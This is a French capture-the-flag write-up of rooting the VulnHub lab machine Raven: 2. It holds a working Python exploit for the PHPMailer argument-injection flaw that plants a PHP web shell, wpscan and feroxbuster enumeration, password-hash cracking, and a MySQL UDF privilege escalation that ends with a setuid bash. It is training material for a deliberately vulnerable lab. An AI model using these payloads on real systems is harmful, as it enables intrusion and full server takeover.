---
title: "Solution du CTF Raven: 2 de VulnHub"
tags: [VulnHub, CTF]
---

[Raven: 2](https://vulnhub.com/entry/raven-2,269/) était un CTF intéressant bien qu'assez proche de son prédécesseur. L'escalade de privilèges finale se basait sur une idée dont je suis surpris de ne l'avoir croisé que maintenant.

On trouve sur le serveur un site web qui est en tout point identique au _Raven_ premier du nom avec là encore un Wordpress.

## mail2rce

C'est parti pour une énumération agressive des plugins et des utilisateurs :

```bash
docker run --add-host raven.local:192.168.56.148 -it --rm wpscanteam/wpscan --url http://raven.local/wordpress/ -e ap,at,u --plugins-detection aggressive
```

On retrouve les mêmes utilisateurs que la dernière fois :

```
[i] User(s) Identified:

[+] michael
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://raven.local/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] steven
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Je n'étais pas très chaud pour lancer un bruteforce des comptes alors j'ai d'abord procédé à la recherche des fichiers sur le serveur web :

```bash
feroxbuster -u http://raven.local/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -x php,txt,zip,html -n
```

Ce qu'il faut retenir de l'output, c'est la présence d'une archive ZIP :

```
301        9l       28w      308c http://raven.local/img
200      341l      986w    13265c http://raven.local/about.html
200      283l      860w    11114c http://raven.local/service.html
200      443l     1329w    16819c http://raven.local/
301        9l       28w      310c http://raven.local/fonts
301        9l       28w      308c http://raven.local/css
200      224l      677w        0c http://raven.local/contact.php
200       19l      103w     3384c http://raven.local/contact.zip
301        9l       28w      314c http://raven.local/wordpress
301        9l       28w      311c http://raven.local/manual
200      443l     1329w    16819c http://raven.local/index.html
200      375l     1049w    15449c http://raven.local/team.html
200      700l     2731w    35226c http://raven.local/elements.html
200       84l      356w    18436c http://raven.local/.DS_Store
```

L'archive `contact.zip` contient le code source de `contact.php` qui montre une utilisation de `PHPMailer` :

```php
<?php                                                                                                  
if (isset($_REQUEST['action'])){                                                                       
    $name=$_REQUEST['name'];                                                                           
    $email=$_REQUEST['email'];                                                                         
    $message=$_REQUEST['message'];                                                                     
    if (($name=="")||($email=="")||($message=="")){                                                    
        echo "There are missing fields.";                                                              
    }else{                                                                                             
        require 'vulnerable/PHPMailerAutoload.php';                                                    
        $mail = new PHPMailer;                                                                         
        $mail->Host = "localhost";                                                                     
        $mail->setFrom($email, 'Vulnerable Server');                                                   
        $mail->addAddress('admin@vulnerable.com', 'Hacker');                                           
        $mail->Subject  = "Message from $name";                                                        
        $mail->Body     = $message;                                                                    
        if(!$mail->send()) {                                                                           
            echo 'Message was not sent.';                                                              
            echo 'Mailer error: ' . $mail->ErrorInfo;                                                  
        } else {                                                                                       
            echo 'Message has been sent.';                                                             
        }                                                                                              
    }                                                                                                  
}                                                                                                      
?>
```

Ça ne m'étonne guère, car j'avais croisé ces fichiers sur le [CTF Raven #1]({% link _posts/2023-03-28-Solution-du-CTF-Raven-1-de-VulnHub.md %}).

J'ai repris le code d'exploitation pour `PHPMailer` que j'avais écrit pour le [CTF DonkeyDocker]({% link _posts/2022-01-13-Solution-du-CTF-DonkeyDocker-de-VulnHub.md %}) et je l'ai adapté :

```python
import sys 
import requests 

RW_DIR = "/var/www/html/wordpress" 
URL = "http://raven.local/contact.php" 

# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033) 
payload = f'"attacker\\" -oQ/tmp/ -X{RW_DIR}/phpcode.php   some"@email.com' 

# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045) 
# payload = f"\"attacker\\' -oQ/tmp/ -X{RW_DIR}/phpcode.php   some\"@email.com" 

RCE_PHP_CODE = "zz<?php system($_GET['cmd']); ?>zz" 

response = requests.post( 
       URL, 
       files={ 
               "action": (None, "submit"), 
               "name": (None, RCE_PHP_CODE + "_name"), 
               "email": (None, payload), 
               "subject": (None, "Hello there"),
               "message": (None, RCE_PHP_CODE + "_message"), 
       }, 
) 
print(response.status_code)
```

Son exécution permet de créer un fichier `phpcode.php` contenant la backdoor de mon choix. Le fichier est placé dans le dossier `wordpress` du site.

## mysql2lpe

Avec mon shell je récupère les identifiants de la BDD dans le fichier de configuration du Wordpress :

```php
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Le hash de `michael` (non cassé) est le même que pour le précédent opus, mais celui de `steven` diffère :

```
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad. | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
```

Je lance `JtR` pour tenter de le casser, en attendant je fouille les flags sur le système :

```console
www-data@Raven:/var/www/html/wordpress$ grep -l -r -i flag1 .. 2> /dev/null 
../vendor/PATH
www-data@Raven:/var/www/html/wordpress$ cat ../vendor/PATH
/var/www/html/vendor/
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
www-data@Raven:/var/www/html/wordpress$ find / -name "flag*" 2> /dev/null 
/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
/var/www/flag2.txt
--- snip ---
www-data@Raven:/var/www/html/wordpress$ cat /var/www/flag2.txt
flag2{6a8ed560f0b5358ecf844108048eb337}
```

`JtR` a fait son travail entre temps :

```console
john --wordlist=rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
LOLLOL1          (steven)     
1g 0:00:01:31 DONE (2023-04-02 13:36) 0.01091g/s 11446p/s 11446c/s 11446C/s LOVERS18..LOLLOL1
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

Malheureusement le mot de passe n'est pas accepté pour le compte Unix.

`LinPEAS` ne remonte pas grand-chose d'intéressant à première vue, pourtant il y a le serveur mysql qui tourne avec le compte `root` :

```console
  890 ?        Sl     0:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid
```

Vu que l'on a les identifiants `root` pour la base de données ça nous laisse quelques possibilités qui sont notamment décrites sur [3306 - Pentesting Mysql - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library).

L'astuce consiste à créer une librairie UDF qui rajoutera une fonctionnalité d'exécution de commande à MySQL. En l'utilisant on exécutera des commandes en tant que `root` (du système).

Il y a un exploit sur _exploit-db_ : [MySQL User-Defined (Linux) x32 / x86_64 - 'sys_exec' Local Privilege Escalation (2) - Linux local Exploit](https://www.exploit-db.com/exploits/50236)

Seulement il utilise Python 3 et uniquement Python 2 est présent sur le système. Peu importe, l'exploit est facile à comprendre, il suffit de copier / coller ce qui nous intéresse dans l'invite `mysql` :

```
mysql> select @@plugin_dir;
+------------------------+
| @@plugin_dir           |
+------------------------+
| /usr/lib/mysql/plugin/ |
+------------------------+
1 row in set (0.00 sec)

mysql> select binary 0x7f454c4602010100000000000000000003003e0001000000d00c000--- snip ---00001000000000000000000000000000000 into dumpfile '/usr/lib/mysql/plugin/udbbackdoor.so';
Query OK, 1 row affected (0.00 sec)
mysql> create function sys_exec returns int soname 'udfbackdoor.so';
Query OK, 0 rows affected (0.01 sec)

mysql> select * from mysql.func where name='sys_exec';
+----------+-----+----------------+----------+
| name     | ret | dl             | type     |
+----------+-----+----------------+----------+
| sys_exec |   2 | udfbackdoor.so | function |
+----------+-----+----------------+----------+
1 row in set (0.00 sec)

mysql> select sys_exec('cp /bin/bash /tmp/bash && chmod +s /tmp/bash');
+----------------------------------------------------------+
| sys_exec('cp /bin/bash /tmp/bash && chmod +s /tmp/bash') |
+----------------------------------------------------------+
|                                                        0 |
+----------------------------------------------------------+
1 row in set (0.01 sec)
```

Notre bash setuid est prêt à l'emploi :

```console
www-data@Raven:/tmp$ ./bash -p
bash-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-4.3# cd /root
bash-4.3# ls
flag4.txt
bash-4.3# cat flag4.txt
  ___                   ___ ___ 
 | _ \__ ___ _____ _ _ |_ _|_ _|
 |   / _` \ V / -_) ' \ | | | | 
 |_|_\__,_|\_/\___|_||_|___|___|
                           
flag4{df2bc5e951d91581467bb9a2a8ff4425}

CONGRATULATIONS on successfully rooting RavenII

I hope you enjoyed this second interation of the Raven VM

Hit me up on Twitter and let me know what you thought: 

@mccannwj / wjmccann.github.io
```
